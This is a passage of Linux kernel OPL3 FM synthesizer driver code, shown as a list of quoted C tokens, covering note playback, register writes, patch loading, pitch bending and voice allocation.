"connection", "method", "for", "4", "OP", "devc", "-", ">", "voc", "is", "defined", "by", "the", "rightmost", "*", "bits", "at", "the", "offsets", "10", "and", "10", "+", "OFFS_4OP", "*", "/", "connection", "=", "(", "(", "instr", "-", ">", "operators", "[", "10", "]", "&", "0x01", ")", "<", "<", "1", ")", "|", "(", "instr", "-", ">", "operators", "[", "10", "+", "OFFS_4OP", "]", "&", "0x01", ")", ";", "switch", "(", "connection", ")", "{", "case", "0", ":", "calc_vol", "(", "&", "vol4", ",", "volume", ",", "main_vol", ")", ";", "break", ";", "case", "1", ":", "calc_vol", "(", "&", "vol2", ",", "volume", ",", "main_vol", ")", ";", "calc_vol", "(", "&", "vol4", ",", "volume", ",", "main_vol", ")", ";", "break", ";", "case", "2", ":", "calc_vol", "(", "&", "vol1", ",", "volume", ",", "main_vol", ")", ";", "calc_vol", "(", "&", "vol4", ",", "volume", ",", "main_vol", ")", ";", "break", ";", "case", "3", ":", "calc_vol", "(", "&", "vol1", ",", "volume", ",", "main_vol", ")", ";", "calc_vol", "(", "&", "vol3", ",", "volume", ",", "main_vol", ")", ";", "calc_vol", "(", "&", "vol4", ",", "volume", ",", "main_vol", ")", ";", "break", ";", "default", ":", ";", "}", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "0", "]", ",", "vol1", ")", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "1", "]", ",", "vol2", ")", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "2", "]", ",", "vol3", ")", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "3", "]", ",", "vol4", ")", ";", "}", "}", "static", "int", "opl3_start_note", "(", "int", "dev", ",", "int", "voice", ",", "int", "note", ",", "int", "volume", ")", "{", "unsigned", "char", "data", ",", "fpc", ";", "int", "block", ",", "fnum", ",", "freq", ",", "voice_mode", ",", "pan", ";", "struct", "sbi_instrument", "*", "instr", ";", "struct", "physical_voice_info", "*", "map", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", "0", ";", "map", "=", "&", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "voice", "]", "];", "pan", "=", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", ";", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "0", ")", "return", "0", ";", "if", "(", "note", "=", "=", "255", ")", "/", "*", "*", "Just", "change", "the", "volume", "*", "/", "{", "set_voice_volume", "(", "voice", ",", "volume", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "volume", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Kill", "previous", "note", "before", "playing", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "1", "]", ",", "0xff", ")", ";", "/", "*", "*", "Carrier", "*", "volume", "to", "*", "min", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "0", "]", ",", "0xff", ")", ";", "/", "*", "*", "Modulator", "*", "volume", "to", "*", "/", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "4", ")", "{", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "2", "]", ",", "0xff", ")", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KSL_LEVEL", "+", "map", "-", ">", "op", "[", "3", "]", ",", "0xff", ")", ";", "}", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KEYON_BLOCK", "+", "map", "-", ">", "voice_num", ",", "0x00", ")", ";", "/", "*", "*", "Note", "*", "off", "*", "/", "instr", "=", "devc", "-", ">", "act_i", "[", "voice", "]", ";", "if", "(", "!", "instr", ")", "instr", "=", "&", "devc", "-", ">", "i_map", "[", "0", "]", ";", "if", "(", "instr", "-", ">", "channel", "<", "0", ")", "{", "printk", "(", "KERN_WARNING", "\"", "opl3", ":", "Initializing", "voice", "%", "d", "with", "undefined", "instrument", "\\", "n", "\"", ",", "voice", ")", ";", "return", "0", ";", "}", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "2", "&", "&", "instr", "-", ">", "key", "=", "=", "OPL3_PATCH", ")", "return", "0", ";", "/", "*", "*", "Cannot", "play", "*", "/", "voice_mode", "=", "map", "-", ">", "voice_mode", ";", "if", "(", "voice_mode", "=", "=", "4", ")", "{", "int", "voice_shift", ";", "voice_shift", "=", "(", "map", "-", ">", "ioaddr", "=", "=", "devc", "-", ">", "left_io", ")", "?", "0", ":", "3", ";", "voice_shift", "+", "=", "map", "-", ">", "voice_num", ";", "if", "(", "instr", "-", ">", "key", "!", "=", "OPL3_PATCH", ")", "/", "*", "*", "Just", "2", "OP", "patch", "*", "/", "{", "voice_mode", "=", "2", ";", "devc", "-", ">", "cmask", "&", "=", "~", "(", "1", "<", "<", "voice_shift", ")", ";", "}", "else", "{", "devc", "-", ">", "cmask", "|", "=", "(", "1", "<", "<", "voice_shift", ")", ";", "}", "opl3_command", "(", "devc", "-", ">", "right_io", ",", "CONNECTION_SELECT_REGISTER", ",", "devc", "-", ">", "cmask", ")", ";", "}", "/", "*", "*", "Set", "Sound", "Characteristics", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "AM_VIB", "+", "map", "-", ">", "op", "[", "0", "]", ",", "instr", "-", ">", "operators", "[", "0", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "AM_VIB", "+", "map", "-", ">", "op", "[", "1", "]", ",", "instr", "-", ">", "operators", "[", "1", "]", ");", "/", "*", "*", "Set", "Attack", "/", "Decay", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "ATTACK_DECAY", "+", "map", "-", ">", "op", "[", "0", "]", ",", "instr", "-", ">", "operators", "[", "4", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "ATTACK_DECAY", "+", "map", "-", ">", "op", "[", "1", "]", ",", "instr", "-", ">", "operators", "[", "5", "]", ");", "/", "*", "*", "Set", "Sustain", "/", "Release", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "SUSTAIN_RELEASE", "+", "map", "-", ">", "op", "[", "0", "]", ",", "instr", "-", ">", "operators", "[", "6", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "SUSTAIN_RELEASE", "+", "map", "-", ">", "op", "[", "1", "]", ",", "instr", "-", ">", "operators", "[", "7", "]", ");", "/", "*", "*", "Set", "Wave", "Select", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "WAVE_SELECT", "+", "map", "-", ">", "op", "[", "0", "]", ",", "instr", "-", ">", "operators", "[", "8", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "WAVE_SELECT", "+", "map", "-", ">", "op", "[", "1", "]", ",", "instr", "-", ">", "operators", "[", "9", "]", ");", "/", "*", "*", "Set", "Feedback", "/", "Connection", "*", "/", "fpc", "=", "instr", "-", ">", "operators", "[", "10", "]", ";", "if", "(", "pan", "!", "=", "0xffff", ")", "{", "fpc", "&", "=", "~", "STEREO_BITS", ";", "if", "(", "pan", "<", "-", "64", ")", "fpc", "|", "=", "VOICE_TO_LEFT", ";", "else", "if", "(", "pan", ">", "64", ")", "fpc", "|", "=", "VOICE_TO_RIGHT", ";", "else", "fpc", "|", "=", "(", "VOICE_TO_LEFT", "|", "VOICE_TO_RIGHT", ")", ";", "}", "if", "(", "!(", "fpc", "&", "0x30", ")", ")", "fpc", "|", "=", "0x30", ";", "/", "*", "*", "Ensure", "that", "at", "least", "one", "chn", "is", "enabled", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "FEEDBACK_CONNECTION", "+", "map", "-", ">", "voice_num", ",", "fpc", ")", ";", "/", "*", "*", "If", "the", "voice", "is", "a", "4", "OP", "one", ",", "initialize", "the", "operators", "3", "and", "4", "also", "*", "/", "if", "(", "voice_mode", "=", "=", "4", ")", "{", "/", "*", "*", "Set", "Sound", "Characteristics", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "AM_VIB", "+", "map", "-", ">", "op", "[", "2", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "0", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "AM_VIB", "+", "map", "-", ">", "op", "[", "3", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "1", "]", ");", "/", "*", "*", "Set", "Attack", "/", "Decay", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "ATTACK_DECAY", "+", "map", "-", ">", "op", "[", "2", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "4", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "ATTACK_DECAY", "+", "map", "-", ">", "op", "[", "3", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "5", "]", ");", "/", "*", "*", "Set", "Sustain", "/", "Release", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "SUSTAIN_RELEASE", "+", "map", "-", ">", "op", "[", "2", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "6", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "SUSTAIN_RELEASE", "+", "map", "-", ">", "op", "[", "3", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "7", "]", ");", "/", "*", "*", "Set", "Wave", "Select", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "WAVE_SELECT", "+", "map", "-", ">", "op", "[", "2", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "8", "]", ");", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "WAVE_SELECT", "+", "map", "-", ">", "op", "[", "3", "]", ",", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "9", "]", ");", "/", "*", "*", "Set", "Feedback", "/", "Connection", "*", "/", "fpc", "=", "instr", "-", ">", "operators", "[", "OFFS_4OP", "+", "10", "]", ";", "if", "(", "!(", "fpc", "&", "0x30", ")", ")", "fpc", "|", "=", "0x30", ";", "/", "*", "*", "Ensure", "that", "at", "least", "one", "chn", "is", "enabled", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "FEEDBACK_CONNECTION", "+", "map", "-", ">", "voice_num", "+", "3", ",", "fpc", ")", ";", "}", "devc", "-", ">", "voc", "[", "voice", "]", ".", "mode", "=", "voice_mode", ";", "set_voice_volume", "(", "voice", ",", "volume", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "volume", ")", ";", "freq", "=", "devc", "-", ">", "voc", "[", "voice", "]", ".", "orig_freq", "=", "note_to_freq", "(", "note", ")", "/", "1000", ";", "/", "*", "*", "Since", "the", "pitch", "bender", "may", "have", "been", "set", "before", "playing", "the", "note", ",", "we", "*", "have", "to", "calculate", "the", "bending", "now", ".", "*", "/", "freq", "=", "compute_finetune", "(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "orig_freq", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender_range", ",", "0", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "current_freq", "=", "freq", ";", "freq_to_fnum", "(", "freq", ",", "&", "block", ",", "&", "fnum", ")", ";", "/", "*", "*", "Play", "note", "*", "/", "data", "=", "fnum", "&", "0xff", ";", "/", "*", "*", "Least", "significant", "bits", "of", "fnumber", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "FNUM_LOW", "+", "map", "-", ">", "voice_num", ",", "data", ")", ";", "data", "=", "0x20", "|", "(", "(", "block", "&", "0x7", ")", "<", "<", "2", ")", "|", "(", "(", "fnum", ">", ">", "8", ")", "&", "0x3", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "keyon_byte", "=", "data", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KEYON_BLOCK", "+", "map", "-", ">", "voice_num", ",", "data", ")", ";", "if", "(", "voice_mode", "=", "=", "4", ")", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KEYON_BLOCK", "+", "map", "-", ">", "voice_num", "+", "3", ",", "data", ")", ";", "return", "0", ";", "}", "static", "void", "freq_to_fnum", "(", "int", "freq", ",", "int", "*", "block", ",", "int", "*", "fnum", ")", "{", "int", "f", ",", "octave", ";", "/", "*", "*", "Converts", "the", "note", "frequency", "to", "block", "and", "fnum", "values", "for", "the", "FM", "chip", "*", "/", "/", "*", "*", "First", "try", "to", "compute", "the", "block", "-", "value", "(", "octave", ")", "where", "the", "note", "belongs", "*", "/", "f", "=", "freq", ";", "octave", "=", "5", ";", "if", "(", "f", "=", "=", "0", ")", "octave", "=", "0", ";", "else", "if", "(", "f", "<", "261", ")", "{", "while", "(", "f", "<", "261", ")", "{", "octave", "-", "-;", "f", "<", "<=", "1", ";", "}", "}", "else", "if", "(", "f", ">", "493", ")", "{", "while", "(", "f", ">", "493", ")", "{", "octave", "+", "+;", "f", ">", ">=", "1", ";", "}", "}", "if", "(", "octave", ">", "7", ")", "octave", "=", "7", ";", "*", "fnum", "=", "freq", "*", "(", "1", "<", "<", "(", "20", "-", "octave", ")", ")", "/", "49716", ";", "*", "block", "=", "octave", ";", "}", "static", "void", "opl3_command", "(", "int", "io_addr", ",", "unsigned", "int", "addr", ",", "unsigned", "int", "val", ")", "{", "int", "i", ";", "/", "*", "*", "The", "original", "2", "-", "OP", "synth", "requires", "a", "quite", "long", "delay", "after", "writing", "to", "a", "*", "register", ".", "The", "OPL", "-", "3", "survives", "with", "just", "two", "INBs", "*", "/", "outb", "(", "((", "unsigned", "char", ")", "(", "addr", "&", "0xff", ")", "),", "io_addr", ")", ";", "if", "(", "devc", "-", ">", "model", "!", "=", "2", ")", "udelay", "(", "10", ")", ";", "else", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "inb", "(", "io_addr", ")", ";", "outb", "(", "((", "unsigned", "char", ")", "(", "val", "&", "0xff", ")", "),", "io_addr", "+", "1", ")", ";", "if", "(", "devc", "-", ">", "model", "!", "=", "2", ")", "udelay", "(", "30", ")", ";", "else", "for", "(", "i", "=", "0", ";", "i", "<", "2", ";", "i", "+", "+)", "inb", "(", "io_addr", ")", ";", "}", "static", "void", "opl3_reset", "(", "int", "devno", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "18", ";", "i", "+", "+)", "devc", "-", ">", "lv_map", "[", "i", "]", "=", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "devc", "-", ">", "nr_voice", ";", "i", "+", "+)", "{", "opl3_command", "(", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "ioaddr", ",", "KSL_LEVEL", "+", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "op", "[", "0", "]", ",", "0xff", ")", ";", "opl3_command", "(", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "ioaddr", ",", "KSL_LEVEL", "+", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "op", "[", "1", "]", ",", "0xff", ")", ";", "if", "(", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "voice_mode", "=", "=", "4", ")", "{", "opl3_command", "(", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "ioaddr", ",", "KSL_LEVEL", "+", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "op", "[", "2", "]", ",", "0xff", ")", ";", "opl3_command", "(", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "ioaddr", ",", "KSL_LEVEL", "+", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "i", "]", "].", "op", "[", "3", "]", ",", "0xff", ")", ";", "}", "opl3_kill_note", "(", "devno", ",", "i", ",", "0", ",", "64", ")", ";", "}", "if", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "{", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "18", ";", "for", "(", "i", "=", "0", ";", "i", "<", "18", ";", "i", "+", "+)", "pv_map", "[", "i", "]", ".", "voice_mode", "=", "2", ";", "}", "}", "static", "int", "opl3_open", "(", "int", "dev", ",", "int", "mode", ")", "{", "int", "i", ";", "if", "(", "devc", "-", ">", "busy", ")", "return", "-", "EBUSY", ";", "devc", "-", ">", "busy", "=", "1", ";", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "?", "18", ":", "9", ";", "devc", "-", ">", "v_alloc", "-", ">", "timestamp", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "18", ";", "i", "+", "+)", "{", "devc", "-", ">", "v_alloc", "-", ">", "map", "[", "i", "]", "=", "0", ";", "devc", "-", ">", "v_alloc", "-", ">", "alloc_times", "[", "i", "]", "=", "0", ";", "}", "devc", "-", ">", "cmask", "=", "0x00", ";", "/", "*", "*", "Just", "2", "OP", "mode", "*", "/", "if", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "opl3_command", "(", "devc", "-", ">", "right_io", ",", "CONNECTION_SELECT_REGISTER", ",", "devc", "-", ">", "cmask", ")", ";", "return", "0", ";", "}", "static", "void", "opl3_close", "(", "int", "dev", ")", "{", "devc", "-", ">", "busy", "=", "0", ";", "devc", "-", ">", "v_alloc", "-", ">", "max_voice", "=", "devc", "-", ">", "nr_voice", "=", "(", "devc", "-", ">", "model", "=", "=", "2", ")", "?", "18", ":", "9", ";", "devc", "-", ">", "fm_info", ".", "nr_drums", "=", "0", ";", "devc", "-", ">", "fm_info", ".", "perc_mode", "=", "0", ";", "opl3_reset", "(", "dev", ")", ";", "}", "static", "void", "opl3_hw_control", "(", "int", "dev", ",", "unsigned", "char", "*", "event", ")", "{", "}", "static", "int", "opl3_load_patch", "(", "int", "dev", ",", "int", "format", ",", "const", "char", "__user", "*", "addr", ",", "int", "count", ",", "int", "pmgr_flag", ")", "{", "struct", "sbi_instrument", "ins", ";", "if", "(", "count", "<", "sizeof", "(", "ins", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "FM", "Error", ":", "Patch", "record", "too", "short", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "if", "(", "copy_from_user", "(", "&", "ins", ",", "addr", ",", "sizeof", "(", "ins", ")", "))", "return", "-", "EFAULT", ";", "if", "(", "ins", ".", "channel", "<", "0", "|", "|", "ins", ".", "channel", ">", "=", "SBFM_MAXINSTR", ")", "{", "printk", "(", "KERN_WARNING", "\"", "FM", "Error", ":", "Invalid", "instrument", "number", "%", "d", "\\", "n", "\"", ",", "ins", ".", "channel", ")", ";", "return", "-", "EINVAL", ";", "}", "ins", ".", "key", "=", "format", ";", "return", "store_instr", "(", "ins", ".", "channel", ",", "&", "ins", ")", ";", "}", "static", "void", "opl3_panning", "(", "int", "dev", ",", "int", "voice", ",", "int", "value", ")", "{", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", "=", "value", ";", "}", "static", "void", "opl3_volume_method", "(", "int", "dev", ",", "int", "mode", ")", "{", "}", "#", "define", "SET_VIBRATO", "(", "cell", ")", "{", "\\", "tmp", "=", "instr", "-", ">", "operators", "[", "(", "cell", "-", "1", ")", "+(", "((", "cell", "-", "1", ")", "/", "2", ")", "*", "OFFS_4OP", ")", "];", "\\", "if", "(", "pressure", ">", "110", ")", "\\", "tmp", "|", "=", "0x40", ";", "/", "*", "Vibrato", "on", "*", "/", "\\", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "AM_VIB", "+", "map", "-", ">", "op", "[", "cell", "-", "1", "]", ",", "tmp", ")", ";}", "static", "void", "opl3_aftertouch", "(", "int", "dev", ",", "int", "voice", ",", "int", "pressure", ")", "{", "int", "tmp", ";", "struct", "sbi_instrument", "*", "instr", ";", "struct", "physical_voice_info", "*", "map", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "map", "=", "&", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "voice", "]", "];", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "0", ")", "return", ";", "/", "*", "*", "Adjust", "the", "amount", "of", "vibrato", "depending", "the", "pressure", "*", "/", "instr", "=", "devc", "-", ">", "act_i", "[", "voice", "]", ";", "if", "(", "!", "instr", ")", "instr", "=", "&", "devc", "-", ">", "i_map", "[", "0", "]", ";", "if", "(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "mode", "=", "=", "4", ")", "{", "int", "connection", "=", "(", "(", "instr", "-", ">", "operators", "[", "10", "]", "&", "0x01", ")", "<", "<", "1", ")", "|", "(", "instr", "-", ">", "operators", "[", "10", "+", "OFFS_4OP", "]", "&", "0x01", ")", ";", "switch", "(", "connection", ")", "{", "case", "0", ":", "SET_VIBRATO", "(", "4", ")", ";", "break", ";", "case", "1", ":", "SET_VIBRATO", "(", "2", ")", ";", "SET_VIBRATO", "(", "4", ")", ";", "break", ";", "case", "2", ":", "SET_VIBRATO", "(", "1", ")", ";", "SET_VIBRATO", "(", "4", ")", ";", "break", ";", "case", "3", ":", "SET_VIBRATO", "(", "1", ")", ";", "SET_VIBRATO", "(", "3", ")", ";", "SET_VIBRATO", "(", "4", ")", ";", "break", ";", "}", "/", "*", "*", "Not", "implemented", "yet", "*", "/", "}", "else", "{", "SET_VIBRATO", "(", "1", ")", ";", "if", "(", "(", "instr", "-", ">", "operators", "[", "10", "]", "&", "0x01", ")", ")", "/", "*", "*", "Additive", "synthesis", "*", "/", "SET_VIBRATO", "(", "2", ")", ";", "}", "}", "#", "undef", "SET_VIBRATO", "static", "void", "bend_pitch", "(", "int", "dev", ",", "int", "voice", ",", "int", "value", ")", "{", "unsigned", "char", "data", ";", "int", "block", ",", "fnum", ",", "freq", ";", "struct", "physical_voice_info", "*", "map", ";", "map", "=", "&", "pv_map", "[", "devc", "-", ">", "lv_map", "[", "voice", "]", "];", "if", "(", "map", "-", ">", "voice_mode", "=", "=", "0", ")", "return", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender", "=", "value", ";", "if", "(", "!", "value", ")", "return", ";", "if", "(", "!(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "keyon_byte", "&", "0x20", ")", ")", "return", ";", "/", "*", "*", "Not", "keyed", "on", "*", "/", "freq", "=", "compute_finetune", "(", "devc", "-", ">", "voc", "[", "voice", "]", ".", "orig_freq", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender", ",", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender_range", ",", "0", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "current_freq", "=", "freq", ";", "freq_to_fnum", "(", "freq", ",", "&", "block", ",", "&", "fnum", ")", ";", "data", "=", "fnum", "&", "0xff", ";", "/", "*", "*", "Least", "significant", "bits", "of", "fnumber", "*", "/", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "FNUM_LOW", "+", "map", "-", ">", "voice_num", ",", "data", ")", ";", "data", "=", "0x20", "|", "(", "(", "block", "&", "0x7", ")", "<", "<", "2", ")", "|", "(", "(", "fnum", ">", ">", "8", ")", "&", "0x3", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "keyon_byte", "=", "data", ";", "opl3_command", "(", "map", "-", ">", "ioaddr", ",", "KEYON_BLOCK", "+", "map", "-", ">", "voice_num", ",", "data", ")", ";", "}", "static", "void", "opl3_controller", "(", "int", "dev", ",", "int", "voice", ",", "int", "ctrl_num", ",", "int", "value", ")", "{", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "switch", "(", "ctrl_num", ")", "{", "case", "CTRL_PITCH_BENDER", ":", "bend_pitch", "(", "dev", ",", "voice", ",", "value", ")", ";", "break", ";", "case", "CTRL_PITCH_BENDER_RANGE", ":", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender_range", "=", "value", ";", "break", ";", "case", "CTL_MAIN_VOLUME", ":", "devc", "-", ">", "voc", "[", "voice", "]", ".", "volume", "=", "value", "/", "128", ";", "break", ";", "case", "CTL_PAN", ":", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", "=", "(", "value", "*", "2", ")", "-", "128", ";", "break", ";", "}", "}", "static", "void", "opl3_bender", "(", "int", "dev", ",", "int", "voice", ",", "int", "value", ")", "{", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "bend_pitch", "(", "dev", ",", "voice", ",", "value", "-", "8192", ")", ";", "}", "static", "int", "opl3_alloc_voice", "(", "int", "dev", ",", "int", "chn", ",", "int", "note", ",", "struct", "voice_alloc_info", "*", "alloc", ")", "{", "int", "i", ",", "p", ",", "best", ",", "first", ",", "avail", ",", "best_time", "=", "0x7fffffff", ";", "struct", "sbi_instrument", "*", "instr", ";", "int", "is4op", ";", "int", "instr_no", ";", "if", "(", "chn", "<", "0", "|", "|", "chn", ">", "15", ")", "instr_no", "=", "0", ";", "else", "instr_no", "=", "devc", "-", ">", "chn_info", "[", "chn", "]", ".", "pgm_num", ";", "instr", "=", "&", "devc", "-", ">", "i_map", "[", "instr_no", "]", ";", "if", "(", "instr", "-", ">", "channel", "<", "0", "|", "|", "/", "*", "Instrument", "not", "loaded", "*", "/", "devc", "-", ">", "nr_voice", "!", "=", "12", ")", "/", "*", "Not", "in", "4", "OP", "mode", "*", "/", "is4op", "=", "0", ";", "else", "if", "(", "devc", "-", ">", "nr_voice", "=", "=", "12", ")", "/", "*", "4", "OP", "mode", "*", "/", "is4op", "=", "(", "instr", "-", ">", "key", "=", "=", "OPL3_PATCH", ")", ";", "else", "is4op", "=", "0", ";", "if", "(", "is4op", ")", "{", "first", "=", "p", "=", "0", ";", "avail", "=", "6", ";", "}", "else", "{", "if", "(", "devc", "-", ">", "nr_voice", "=", "=", "12", ")", "/", "*", "4", "OP", "mode", ".", "Use", "the", "'", "2", "OP", "only", "'", "operators", "first", "*", "/", "first", "=", "p", "=", "6", ";", "else", "first", "=", "p", "=", "0", ";", "avail", "=", "devc", "-", ">", "nr_voice", ";", "}", "/", "*", "*", "Now", "try", "to", "find", "a", "free", "voice", "*", "/", "best", "=", "first", ";", "for", "(", "i", "=", "0", ";", "i", "<", "avail", ";", "i", "+", "+)", "{", "if", "(", "alloc", "-", ">", "map", "[", "p", "]", "=", "=", "0", ")", "{", "return", "p", ";", "}", "if", "(", "alloc", "-", ">", "alloc_times", "[", "p", "]", "<", "best_time", ")", "/", "*", "Find", "oldest", "playing", "note", "*", "/", "{", "best_time", "=", "alloc", "-", ">", "alloc_times", "[", "p", "]", ";", "best", "=", "p", ";", "}", "p", "=", "(", "p", "+", "1", ")", "%", "avail", ";", "}", "/", "*", "*", "Insert", "some", "kind", "of", "priority", "mechanism", "here", ".", "*", "/", "if", "(", "best", "<", "0", ")", "best", "=", "0", ";", "if", "(", "best", ">", "devc", "-", ">", "nr_voice", ")", "best", "-", "=", "devc", "-", ">", "nr_voice", ";", "return", "best", ";", "/", "*", "All", "devc", "-", ">", "voc", "in", "use", ".", "Select", "the", "first", "one", ".", "*", "/", "}", "static", "void", "opl3_setup_voice", "(", "int", "dev", ",", "int", "voice", ",", "int", "chn", ")", "{", "struct", "channel_info", "*", "info", ";", "if", "(", "voice", "<", "0", "|", "|", "voice", ">", "=", "devc", "-", ">", "nr_voice", ")", "return", ";", "if", "(", "chn", "<", "0", "|", "|", "chn", ">", "15", ")", "return", ";", "info", "=", "&", "synth_devs", "[", "dev", "]", "->", "chn_info", "[", "chn", "]", ";", "opl3_set_instr", "(", "dev", ",", "voice", ",", "info", "-", ">", "pgm_num", ")", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender", "=", "0", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "bender_range", "=", "info", "-", ">", "bender_range", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "volume", "=", "info", "-", ">", "controllers", "[", "CTL_MAIN_VOLUME", "]", ";", "devc", "-", ">", "voc", "[", "voice", "]", ".", "panning", "=", "(", "info", "-", ">", "controllers", "[", "CTL_PAN", "]", "*", "2", ")", "-", "128", ";", "}", "static", "struct", "synth_operations", "opl3_operations", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "id", "=", "\"", "OPL", "\"", ",", ".", "info", "=", "NULL", ",", ".", "midi_dev", "=", "0", ",", ".", "synth_type", "=", "SYNTH_TYPE_FM", ",", ".", "synth_subtype", "=", "FM_TYPE_ADLIB", ",", ".", "open", "=", "opl3_open", ",", ".", "close", "=", "opl3_close", ",", ".", "ioctl", "=", "opl3_ioctl", ",", ".", "kill_note", "=", "opl3_kill_note", ",", ".", "start_note", "=", "opl3_start_note", ",", ".", "set_instr", "=", "opl3_set_instr", ",", ".", "reset", "=", "opl3_reset", ",", ".", "hw_control", "=", "opl3_hw_control", ",", ".", "load_patch", "=", "opl3_load_patch", ",", ".", "aftertouch", "=", "opl3_aftertouch", ",", ".", "controller", "=", "opl3_controller", ",", ".", "panning", "=", "opl3_panning", ",", ".", "volume_method", "=", 